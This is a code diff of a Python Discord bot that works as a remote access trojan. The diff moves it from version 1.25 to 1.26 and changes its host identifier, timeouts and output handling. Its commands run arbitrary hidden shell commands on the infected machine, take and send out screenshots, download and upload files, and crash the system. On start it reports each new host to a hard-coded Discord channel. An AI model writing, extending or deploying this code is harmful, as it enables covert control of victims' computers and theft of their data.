@@ -6,11 +6,13 @@ import pyautogui
 import winsound
 import requests
 import discord
+import asyncio
 import ctypes
+import random
+import string
 import sys
 import os
 import re
-
 
 if getattr(sys, 'frozen', False):
     file_path = os.path.abspath(sys.executable)
@@ -20,8 +22,8 @@ else:
     silent = 0
 
 file_name = file_path.split("\\")[-1]
-copium_ver = 1.25
-whoami = subprocess.check_output("wmic csproduct get uuid").decode().strip().replace("\r", "").split("\n")[1].strip()
+copium_ver = 1.26
+whoami = f"{os.getlogin()}-{random.choice(string.ascii_letters)}{random.randint(0, 9)}"
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
 
@@ -56,7 +58,7 @@ def log_command(ctx, args=None, error=False):
 async def on_ready():
     await client.tree.sync()
 
-    channel = await client.fetch_channel(960345653454729226)
+    channel = await client.fetch_channel(784447382536454145)
     await channel.send(f"Host started on \"{whoami}\"")
 
     logon_message = f'Logged on as {client.user}, at {datetime.now().strftime("%H:%M:%S")}, in the servers:'
@@ -103,7 +105,7 @@ async def download_command(ctx, url, filename=None):
                 file.write(chunk)
         if file:
             await ctx.reply(f"Downloaded {discord_formatted_path} successfully", ephemeral=True)
-    print(log_command(ctx, url+" "+filename))
+    print(log_command(ctx, url + " " + filename))
 
 
 @client.hybrid_command(name="upload", with_app_command=True, description="uploads from the path to discord")
@@ -118,10 +120,12 @@ async def upload_command(ctx, path):
 
 @client.hybrid_command(name="login", with_app_command=True, description="logs into the specified host")
 async def login_command(ctx, host):
+    global current_login
     if host == whoami:
-        global current_login
         current_login = whoami
         await ctx.reply(f"Logged into {current_login}", ephemeral=True)
+    else:
+        current_login = None
     print(log_command(ctx, host))
 
 
@@ -152,13 +156,16 @@ async def playsound_command(ctx, filepath):
 
 
 @client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
-async def screenshot_command(ctx):
+async def screenshot_command(ctx, path=None):
     if current_login != whoami:
         return
-
-    pyautogui.screenshot("ss.png")
-    await ctx.reply(file=discord.File("ss.png"), ephemeral=True)
-    os.remove("ss.png")
+    if path:
+        path = os.path.join(path, "ss.png")
+    else:
+        path = "ss.png"
+    pyautogui.screenshot(path)
+    await ctx.reply(file=discord.File(path), ephemeral=True)
+    os.remove(path)
     print(log_command(ctx))
 
 
@@ -175,21 +182,24 @@ async def bsod_command(ctx):
 
 
 @client.hybrid_command(name="cmd", with_app_command=True, description="executes a shell command in the host")
-async def cmd_command(ctx, *, command):
+async def cmd_command(ctx, *, command, timeout: int = 30):
     if current_login != whoami:
         return
 
-    command_result = subprocess.run(command, shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout
-    if command_result:
-        if len(command_result) <= 1983:
-            await ctx.reply(f'Command result: {command_result}', ephemeral=True)
-        else:
-            with open("result.txt", "w") as f:
-                f.write(command_result)
-            await ctx.reply(f'Command result is {len(command_result)}, sending the result in a file', file=discord.File('result.txt'), ephemeral=True)
-            os.remove("result.txt")
+    await ctx.reply(f'terminal response for "{command}" incoming:', ephemeral=True)
+    await asyncio.sleep(0.1)
+
+    command_result = subprocess.run(command, shell=True, timeout=timeout, capture_output=True, encoding='cp858', creationflags=silent).stdout
+
+    max_length = 2000
+    if len(command_result) > max_length:
+        for char in range(0, len(command_result), max_length):
+            await ctx.reply(command_result[char:char + max_length], ephemeral=True)
+            await asyncio.sleep(1)
+    elif command_result:
+        await ctx.reply(command_result, ephemeral=True)
     else:
-        await ctx.reply("Command result is None", ephemeral=True)
+        await ctx.reply(f'{command} did not return any results', ephemeral=True)
     print(log_command(ctx, command))
 
 
